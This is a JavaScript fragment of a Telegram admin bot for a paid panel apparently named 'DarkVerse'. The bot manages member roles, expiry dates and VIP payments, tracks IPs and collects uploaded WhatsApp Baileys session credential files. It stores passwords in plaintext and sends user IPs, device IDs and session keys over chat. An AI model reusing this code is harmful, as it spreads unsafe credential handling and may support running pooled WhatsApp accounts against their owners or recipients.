    console.log(`[SOCK] Fallback: using ${allKeys[0]}`);
    return activeConnections[allKeys[0]];
  }

  return null;
}


const telegramDataPath = "telegram.json";
const dbPath = "database.json";

// ===== Helpers =====
function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

// Cek apakah userId Telegram adalah owner bot.
// True kalau:
//   - userId === OWNER_ID (developer utama), ATAU
//   - userId ada di telegram.json ownerList
function isTelegramOwner(userId) {
  try {
    const num = Number(userId);
    if (num === Number(OWNER_ID)) return true;
    const config = loadTelegramConfig();
    return (config.ownerList || []).some(o => Number(o.id) === num || Number(o) === num);
  } catch (_) {
    return false;
  }
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}


function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

// ===== Command Handlers =====
bot.onText(/^\/?(start|menu)/, (msg) => {
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = isTelegramOwner(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.sendMessage(id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 Buat Akun Member", callback_data: "create_member" }],
        [{ text: "⏳ Set Expired", callback_data: "set_expire" }],
        ...(isOwner ? [[
          { text: "📋 List User", callback_data: "list_user" },
          { text: "🎛 Buat Custom User", callback_data: "create_custom" },
          { text: "🗑 Hapus User", callback_data: "delete_user" }
        ]] : [])
      ]
    }
  };

  bot.sendMessage(id, `👋 Halo ${msg.from.first_name}, pilih menu:`, options);
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      // Simpan ke folder sessions/<userId>/
      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      // Jika file sudah ada, buat nama acak
      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now(); // atau bisa juga pakai: Math.random().toString(36).slice(2, 8)
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.onText(/^\/?refresh/, async (msg) => {
  const config = loadTelegramConfig();
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = isTelegramOwner(userId);
  if (!isOwner) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.")
  await refreshUserSessions()
  await bot.sendMessage(chatId, "⚠️ Server Is Refreshing wait for 30-60 Seconds.");
})

bot.onText(/^\/?globalsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isDeveloper(msg.from.id)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, "lu ngapain");
  }

  const connectedBiz = Object.keys(biz);
  const connectedMess = Object.keys(mess);
  const connectedNumbers = Object.keys(activeConnections);

  const onlineMess = connectedMess || [];
  const onlineBiz = connectedBiz || [];
  const onlineNumbers = connectedNumbers || [];

  let message = `📌 Global Session\n\n`;

  message += 'Messenger Session:\n';
  message += onlineMess.length > 0
    ? connectedMess.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nBusiness Session:\n';
  message += onlineBiz.length > 0
    ? connectedBiz.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nActive Numbers:\n';
  message += onlineNumbers.length > 0
    ? connectedNumbers.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  bot.sendMessage(chatId, message);
});

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  // Skip callback VIP — ditangani oleh handler VIP dedicated di bawah
  if (typeof data === 'string' && data.startsWith('vip_')) return;
  // Skip callback reset — ditangani oleh handler di registerResetButton
  if (typeof data === 'string' && (data.startsWith('confirm_') || data === 'cancel_reset')) return;
  const config = loadTelegramConfig();
  const isOwner = isTelegramOwner(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });

  switch (data) {
    case "create_member":
      bot.sendMessage(id, "Masukkan data: `username|password|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role: "member", expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun member dibuat:
👤 Username: ${username}
🔐 Password: ${password}`);
      });
      break;

    case "set_expire":
      bot.sendMessage(id, "Masukkan: `username|tambah_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, addDays] = msg.text.split("|");
        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        const config = loadTelegramConfig();
        const isOwner = isTelegramOwner(id);

        // Cegah userList mengubah role selain member
        if (!isOwner && user.role !== "member") {
          return bot.sendMessage(id, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
        }

        const current = new Date(user.expiredDate);
        current.setDate(current.getDate() + parseInt(addDays));
        user.expiredDate = current.toISOString().split("T")[0];
        saveDatabase(db);
        bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}`);
      });
      break;

    case "list_user":
      if (!isOwner) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 *Daftar Pengguna:*
${users}`, { parse_mode: "Markdown" });
      break;

    case "create_custom":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan: `username|password|role|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, role, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role, expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun ${role} dibuat:
👤 Username: ${username}`);
      });
      break;

    case "delete_user":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text);
        if (index === -1) return bot.sendMessage(id, "❌ User tidak ditemukan.");
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `🗑️ User ${deleted.username} berhasil dihapus.`);
      });
      break;
  }
});

function formatUptime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

bot.onText(/^\/?status$/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isDeveloper(msg.from.id)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const uptime = formatUptime(process.uptime());
    const ramUsage = process.memoryUsage().rss / 1024 / 1024;
    const cpuLoad = os.loadavg()[0];
    const db = JSON.parse(fs.readFileSync('./database.json'));
    const dbLength = Array.isArray(db) ? db.length : Object.keys(db).length;

    const pingStart = Date.now();
    await axios.get(`http://arzzpanel.arzzhostingxcloud.my.id:${PORT}/ping`);
    const ping = Date.now() - pingStart;

    const text = `*DarkVerse Server Status*

*Server Online* [${new Date().toLocaleTimeString()}]
*Ping:* ~${ping}ms
*RAM:* ${ramUsage.toFixed(2)} MB
*CPU:* ${cpuLoad.toFixed(2)}
*Uptime:* ${uptime}
*Total Database:* ${dbLength}
*Server Protect*: *AXRRG-Secure*`;

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error("❌ Gagal ambil status:", err.message);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil status server.");
  }
});

// === Fitur Track IP ===
bot.onText(/^\/?trackip (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1].trim();
  
  if (!isDeveloper(msg.from.id)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (!/^(?:\d{1,3}\.){3}\d{1,3}$/.test(ip) && !/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(ip)) {
    return bot.sendMessage(chatId, "⚠️ Format IP / domain tidak valid.\n\nContoh:\n`/trackip 8.8.8.8`\n`/trackip google.com`", { parse_mode: "Markdown" });
  }

  await bot.sendMessage(chatId, "🔍 Sedang melacak informasi IP...");

  try {
    const { data } = await axios.get(`https://ipapi.co/${ip}/json/`);

    if (data.error) {
      return bot.sendMessage(chatId, `❌ Gagal melacak IP: ${data.reason || "tidak ditemukan."}`);
    }

    const info = `
*IP Tracker Result*

IP: ${data.ip || ip}
Kota: ${data.city || "-"}
Negara: ${data.country_name || "-"} (${data.country_code || "?"})
Zona Waktu: ${data.timezone || "-"}
ISP: ${data.org || "-"}
Latitude: ${data.latitude || "-"}
Longitude: ${data.longitude || "-"}

Database: ${data.asn || "-"}
    `.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

    // Kirim peta lokasi (jika ada koordinat)
    if (data.latitude && data.longitude) {
      await bot.sendLocation(chatId, data.latitude, data.longitude);
    }

  } catch (err) {
    console.error("❌ Error trackip:", err.message);
    bot.sendMessage(chatId, "❌ Gagal mengambil data IP, coba lagi nanti.");
  }
});

// ===== Fitur reset akun by role =====
// Usage:
// 1) /resetakunmember        -> bot akan menanyakan konfirmasi
// 2) /resetakunmember yes    -> konfirmasi, lalu hapus semua akun role 'member'
// Sama untuk: resetakunowner, resetakunreseller, resetakunvip
// Untuk hapus semua akun: /resetall yes
// NOTE: hanya telegram owner (config.ownerList) yang boleh menjalankan.
// === FITUR RESET AKUN DENGAN BUTTON KONFIRMASI (HANYA ID KAMU) ===
// 🔐 Ganti dengan ID Telegram kamu

function loadDB() {
  if (!fs.existsSync("database.json")) fs.writeFileSync("database.json", JSON.stringify([]));
  return JSON.parse(fs.readFileSync("database.json"));
}
function saveDB(data) {
  fs.writeFileSync("database.json", JSON.stringify(data, null, 2));
}

// 🔧 Fungsi utama hapus akun
function doReset(role) {
  const db = loadDB();
  let deleted = [], remain = [];

  if (role === "all") {
    deleted = db.map(u => u.username);
    remain = [];
  } else {
    for (const u of db) {
      if ((u.role || "member") === role) deleted.push(u.username);
      else remain.push(u);
    }
  }

  saveDB(remain);
  fs.writeFileSync("reset_result.txt", deleted.join("\n") || "Tidak ada akun dihapus.");

  return deleted;
}

// 🔘 Command reset dengan tombol konfirmasi
function registerResetButton(cmd, role) {
  bot.onText(new RegExp(`^\\/?${cmd}$`, "i"), async (msg) => {
    if (!isDeveloper(msg.from.id)) return bot.sendMessage(msg.chat.id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

    const roleName = role === "all" ? "SEMUA AKUN" : `role *${role}*`;
    const opts = {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ Konfirmasi", callback_data: `confirm_${cmd}` }],
          [{ text: "❌ Batal", callback_data: "cancel_reset" }]
        ]
      }
    };
    bot.sendMessage(msg.chat.id, `⚠️ Apakah kamu yakin ingin menghapus ${roleName}?`, opts);
  });

  // Handle klik tombol konfirmasi
  bot.on("callback_query", async (query) => {
    const data = query.data;
    const fromId = query.from.id;
    const chatId = query.message.chat.id;

    if (data === `confirm_${cmd}`) {
      if (!isDeveloper(fromId)) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }

      const deleted = doReset(role);
      const info = deleted.length > 0 ? `✅ ${deleted.length} akun dihapus.` : "ℹ️ Tidak ada akun yang dihapus.";

      await bot.sendDocument(chatId, "reset_result.txt", {
        caption: `*Berhasil menghapus ${deleted.length} akun*\n${role === "all" ? "🗑 Semua akun" : `🗑 Role: ${role}`}`,
        parse_mode: "Markdown"
      });
      return bot.answerCallbackQuery(query.id, { text: info });
    }

    if (data === "cancel_reset") {
      if (!isDeveloper(fromId)) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }
      bot.answerCallbackQuery(query.id, { text: "❌ Dibatalkan." });
      bot.sendMessage(chatId, "🚫 Aksi reset dibatalkan.");
    }
  });
}

// 🔹 Daftarkan semua perintah
registerResetButton("resetakunowner", "owner");
registerResetButton("resetakunreseller", "reseller");
registerResetButton("resetakunvip", "vip");
registerResetButton("resetakunmember", "member");
registerResetButton("resetall", "all");

// ═══════════════════════════════════════════════════════════════════════════
// === FITUR VIP REQUEST MANAGEMENT VIA TELEGRAM ===
//
// Owner bisa:
//   /viprequests              → list semua request pending
//   /vipapprove <id>          → approve by ID (sebagai fallback kalau tombol gak muncul)
//   /vipreject <id> [alasan]  → reject by ID
//
// Plus inline button callback:
//   vip_approve_<id>  → approve langsung dari message notifikasi
//   vip_reject_<id>   → reject langsung dari message notifikasi
//   vip_view_<id>     → kirim ulang foto bukti
// ═══════════════════════════════════════════════════════════════════════════

// Helper: cari username owner Telegram di database (kalau ada), biar
// `decidedBy` di log bisa pakai username, bukan cuma "Telegram".
// Kalau gak ada, fallback ke "Telegram:<id>".
function resolveOwnerNameFromTelegram(fromId) {
  try {
    const db = loadDatabase();
    // Cari user yang pairId-nya sama dengan fromId (kalau pernah diset),
    // atau cari di telegram.json ownerList.
    const tg = loadTelegramConfig();
    const ownerEntry = (tg.ownerList || []).find(o => Number(o.id) === Number(fromId));
    if (ownerEntry?.username) return ownerEntry.username;
    // Fallback: cari di database role owner
    const dbOwner = db.find(u => u.role === 'owner');
    if (dbOwner) return dbOwner.username;
  } catch (_) {}
  return `Telegram:${fromId}`;
}

// /viprequests — list semua request pending
bot.onText(/^\/?viprequests?$/i, async (msg) => {
  const chatId = msg.chat.id;
  if (!isDeveloper(msg.from.id)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }
  try {
    const requests = loadVipRequests().filter(r => r.status === 'pending');
    if (requests.length === 0) {
      return bot.sendMessage(chatId, "✅ Tidak ada request VIP pending.");
    }
    let txt = `🔔 *${requests.length} VIP REQUEST PENDING:*\n\n`;
    for (const r of requests.slice(0, 10)) {
      txt += `👤 *${r.username}*\n` +
             `📦 ${r.packageLabel} • Rp ${Number(r.price).toLocaleString('id-ID')}\n` +
             `🌐 \`${r.ip || 'unknown'}\`\n` +
             `🕒 ${new Date(r.createdAt).toLocaleString('id-ID')}\n` +
             `🆔 \`${r.id}\`\n\n`;
    }
    if (requests.length > 10) {
      txt += `...dan ${requests.length - 10} request lainnya. Gunakan Admin Panel di app untuk lihat semua.`;
    }
    // Inline button approve/reject untuk request pertama (biar gak spam)
    const first = requests[0];
    if (first) {
      const opts = {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[
            { text: '✅ APPROVE', callback_data: `vip_approve_${first.id}` },
            { text: '❌ REJECT',  callback_data: `vip_reject_${first.id}` },
          ]],
        },
      };
      return bot.sendMessage(chatId, txt, opts);
    }
    return bot.sendMessage(chatId, txt, { parse_mode: 'Markdown' });
  } catch (e) {
    return bot.sendMessage(chatId, `❌ Error: ${e.message}`);
  }
});

// /vipapprove <id>
bot.onText(/^\/?vipapprove\s+(\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isDeveloper(msg.from.id)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin.");
  }
  const requestId = match[1];
  const decidedBy = resolveOwnerNameFromTelegram(msg.from.id);
  const result = doApproveVip(requestId, decidedBy);
  if (!result.ok) {
    return bot.sendMessage(chatId, `❌ ${result.message}`);
  }
  await bot.sendMessage(chatId,
    `✅ *VIP APPROVED*\n\n` +
    `👤 User: *${result.request.username}*\n` +
    `📦 Paket: ${result.request.packageLabel}\n` +
    `🎯 Role sekarang: VIP\n` +
    `⏰ Expired: ${result.user.expiredDate}`,
    { parse_mode: 'Markdown' });
  notifyOwnerVipDecision(result.request, decidedBy, 'approved', { expiredDate: result.user.expiredDate }).catch(() => {});
});

// /vipreject <id> [alasan]
bot.onText(/^\/?vipreject\s+(\S+)(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isDeveloper(msg.from.id)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin.");
  }
  const requestId = match[1];
  const reason = match[2] || '';
  const decidedBy = resolveOwnerNameFromTelegram(msg.from.id);
  const result = doRejectVip(requestId, decidedBy, reason);
  if (!result.ok) {
    return bot.sendMessage(chatId, `❌ ${result.message}`);
  }
  await bot.sendMessage(chatId,
    `❌ *VIP REJECTED*\n\n` +
    `👤 User: *${result.request.username}*\n` +
    `📦 Paket: ${result.request.packageLabel}\n` +
    `📝 Alasan: ${result.request.rejectReason}`,
    { parse_mode: 'Markdown' });
  notifyOwnerVipDecision(result.request, decidedBy, 'rejected', { reason: result.request.rejectReason }).catch(() => {});
});

// Handler callback_query untuk tombol inline VIP
// (dipisah dari registerResetButton biar gak redundant; bot.on cuman dipasang sekali)
bot.on('callback_query', async (query) => {
  try {
    const data = query.data || '';
    if (!data.startsWith('vip_')) return; // bukan callback VIP, skip

    const fromId = query.from.id;
    const chatId = query.message?.chat?.id;
    if (!chatId) return;

    if (!isDeveloper(fromId)) {
      return bot.answerCallbackQuery(query.id, {
        text: '❌ Kamu tidak punya izin.',
        show_alert: true,
      });
    }

    // Format: vip_approve_<id> | vip_reject_<id> | vip_view_<id>
    const m = data.match(/^vip_(approve|reject|view)_(.+)$/);
    if (!m) {
      return bot.answerCallbackQuery(query.id, { text: 'Format callback tidak dikenal' });
    }
    const action = m[1];
    const requestId = m[2];
    const decidedBy = resolveOwnerNameFromTelegram(fromId);

    if (action === 'view') {
      // Kirim ulang foto bukti
      const requests = loadVipRequests();
      const r = requests.find(x => x.id === requestId);
      if (!r) {
        return bot.answerCallbackQuery(query.id, { text: 'Request tidak ditemukan', show_alert: true });
      }
      const proofPath = path.join(__dirname, r.proofFile || '');
      if (!fs.existsSync(proofPath)) {
        return bot.answerCallbackQuery(query.id, { text: 'File bukti hilang', show_alert: true });
      }
      await bot.sendPhoto(chatId, proofPath, {
        caption: `👁 *Bukti Transfer*\n👤 ${r.username}\n📦 ${r.packageLabel} • Rp ${Number(r.price).toLocaleString('id-ID')}\n🆔 \`${r.id}\``,
        parse_mode: 'Markdown',
      });
      return bot.answerCallbackQuery(query.id, { text: 'Bukti dikirim' });
    }

    if (action === 'approve') {
      const result = doApproveVip(requestId, decidedBy);
      if (!result.ok) {
        return bot.answerCallbackQuery(query.id, { text: `❌ ${result.message}`, show_alert: true });
      }
      // Edit message asli jadi "✅ Approved"
      try {
        await bot.editMessageCaption(
          `✅ *APPROVED* — ${result.request.username} sekarang VIP\n` +
          `📦 ${result.request.packageLabel} • Rp ${Number(result.request.price).toLocaleString('id-ID')}\n` +
          `⏰ Expired: ${result.user.expiredDate}\n` +
          `🛠 Decided by: ${decidedBy}`,
          {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: 'Markdown',
          }
        );
      } catch (_) {}
      await bot.answerCallbackQuery(query.id, { text: `✅ Approved: ${result.request.username}` });
      notifyOwnerVipDecision(result.request, decidedBy, 'approved', { expiredDate: result.user.expiredDate }).catch(() => {});
      return;
    }

    if (action === 'reject') {
      const result = doRejectVip(requestId, decidedBy, 'Ditolak via Telegram');
      if (!result.ok) {
        return bot.answerCallbackQuery(query.id, { text: `❌ ${result.message}`, show_alert: true });
      }
      try {
        await bot.editMessageCaption(
          `❌ *REJECTED* — ${result.request.username}\n` +
          `📦 ${result.request.packageLabel} • Rp ${Number(result.request.price).toLocaleString('id-ID')}\n` +
          `📝 Alasan: ${result.request.rejectReason}\n` +
          `🛠 Decided by: ${decidedBy}`,
          {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: 'Markdown',
          }
        );
      } catch (_) {}
      await bot.answerCallbackQuery(query.id, { text: `❌ Rejected: ${result.request.username}` });
      notifyOwnerVipDecision(result.request, decidedBy, 'rejected', { reason: result.request.rejectReason }).catch(() => {});
      return;
    }
  } catch (err) {
    console.error('[VIP-TELEGRAM] callback_query error:', err.message);
    try { await bot.answerCallbackQuery(query.id, { text: 'Internal error', show_alert: true }); } catch (_) {}
  }
});

// === FITUR /INFO <username> ===
bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (!isDeveloper(fromId)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const username = match[1].trim().toLowerCase();

  try {
    if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");

    const db = JSON.parse(fs.readFileSync("database.json"));
    const keys = JSON.parse(fs.readFileSync("keyList.json"));

    // cari data akun
    const dbUser = db.find(u => (u.username || "").toLowerCase() === username);
    const keyUser = keys.find(k => (k.username || "").toLowerCase() === username);

    if (!dbUser && !keyUser) {
      return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    // ambil data dari database.json
    const role = dbUser?.role || "member";
    const expired = dbUser?.expiredDate || "Tidak ada";
    const lastSend = dbUser?.lastSend
      ? new Date(dbUser.lastSend).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum pernah";

    // ambil data dari keyList.json
    const lastLogin = keyUser?.lastLogin
      ? new Date(keyUser.lastLogin).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum login";
    const ip = keyUser?.ipAddress || "Tidak diketahui";
    const android = keyUser?.androidId || "-";
    const session = keyUser?.sessionKey || "-";

    const info = `
*INFORMASI AKUN*

*Username:* ${dbUser?.username || keyUser?.username || username}
*Role:* ${role}
*Expired Date:* ${expired}
*Terakhir Kirim:* ${lastSend}
*Terakhir Login:* ${lastLogin}
*IP Address:* ${ip}
*Android ID:* ${android}
*Session Key:* ${session}
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error info:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data akun.");
  }
});

// === FITUR /STATS - STATUS BOT & USER ===
const startTime = Date.now();

function getUptime() {
  const seconds = Math.floor((Date.now() - startTime) / 1000);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  return `${h}j ${m}m ${s}d`;
}

bot.onText(/^\/?(stats|status)$/i, async (msg) => {
  const chatId = msg.chat.id;

  if (!isDeveloper(msg.from.id)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    // === Load database user ===
    let users = [];
    if (fs.existsSync("database.json")) {
      users = JSON.parse(fs.readFileSync("database.json"));
    }

    const totalUser = users.length;
    const countRole = (role) => users.filter(u => (u.role || "member") === role).length;

    const owners = countRole("owner");
    const resellers = countRole("reseller");
    const vips = countRole("vip");
    const members = countRole("member");

    // === Cek session WhatsApp aktif (jika pakai Baileys MD) ===
    const connectedMess = Object.keys(mess || {}).length || 0;
    const connectedBiz = Object.keys(biz || {}).length || 0;
    const connectedNumbers = Object.keys(activeConnections || {}).length || 0;

    // === Buat tampilan stats ===
    const info = `
*Bot Statistics*

*Status:* Online
*Uptime:* ${getUptime()}

*User Data*
• Total User: ${totalUser}
• Owner: ${owners}
• Reseller: ${resellers}
• VIP: ${vips}
• Member: ${members}

*WhatsApp Session*
• Messenger: ${connectedMess}
• Business: ${connectedBiz}
• Active Numbers: ${connectedNumbers}

*Tanggal:* ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error stats:", err);
    bot.sendMessage(chatId, "❌ Gagal mengambil data stats.");
  }
});

bot.onText(/^\/?statususer$/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isDeveloper(msg.from.id)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const dbPath = "./database.json";
    const logPath = "logUser.txt";

    if (!fs.existsSync(dbPath)) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    const db = JSON.parse(fs.readFileSync(dbPath, "utf-8"));

    if (!fs.existsSync(logPath)) return bot.sendMessage(chatId, "📊 Belum ada data log pembuatan akun.");

    const logs = fs.readFileSync(logPath, "utf-8").split("\n").filter(Boolean);

    // Hitung berapa kali setiap user membuat akun
    const countMap = {};
    for (const line of logs) {
      const match = line.match(/^(\S+)\s+Created\s+/);
      if (match) {
        const creator = match[1];
        countMap[creator] = (countMap[creator] || 0) + 1;
      }
    }

    // Gabungkan data username, role, dan total akun dibuat
    const list = db.map(u => ({
      username: u.username,
      role: u.role || "member",
      total: countMap[u.username] || 0
    }));

    // Urutkan dari yang paling banyak membuat akun
    list.sort((a, b) => b.total - a.total);

    // Format teks file
    let teks = `📊 STATUS USER & AKTIVITAS BOT\nGenerated: ${new Date().toLocaleString()}\n\n`;
    teks += `Username | Role | Total Akun Dibuat\n`;
    teks += `-------------------------------------\n`;

    for (const u of list) {
      teks += `${u.username} | ${u.role} | ${u.total}\n`;
    }

    const filePath = "./statususer.txt";
    fs.writeFileSync(filePath, teks);

    await bot.sendDocument(chatId, filePath, {
      caption: "📄 Berikut status semua user & jumlah akun yang telah mereka buat."
    });

    fs.unlinkSync(filePath); // hapus file setelah dikirim
  } catch (err) {
    console.error("[❌ STATUSUSER ERROR]", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat laporan status user.");
  }
});

const SESSION_PATH = path.join(__dirname, "permenmd");

// === Fitur /clearsession ===
bot.onText(/^\/?clearsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isDeveloper(msg.from.id)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder session tidak ditemukan.");
    }

    // Hapus seluruh isi folder permenmd
    fs.rmSync(SESSION_PATH, { recursive: true, force: true });
    fs.mkdirSync(SESSION_PATH, { recursive: true }); // buat ulang folder kosong

    bot.sendMessage(chatId, "✅ Semua session dihapus dengan sukses (folder *permenmd* dikosongkan).");
    console.log("🧹 Semua session telah dihapus melalui /clearsession");
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Gagal menghapus semua session.");
  }
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isDeveloper(msg.from.id)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder 'permenmd' tidak ditemukan.");
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      // Cek apakah folder berisi file .json
      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    bot.sendMessage(chatId, `Berhasil menghapus ${deletedCount} folder session yang tidak berisi file .json.`);
    console.log(`🧹 ${deletedCount} folder session kosong dihapus.`);
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Terjadi error saat membersihkan session kosong.");
  }
});

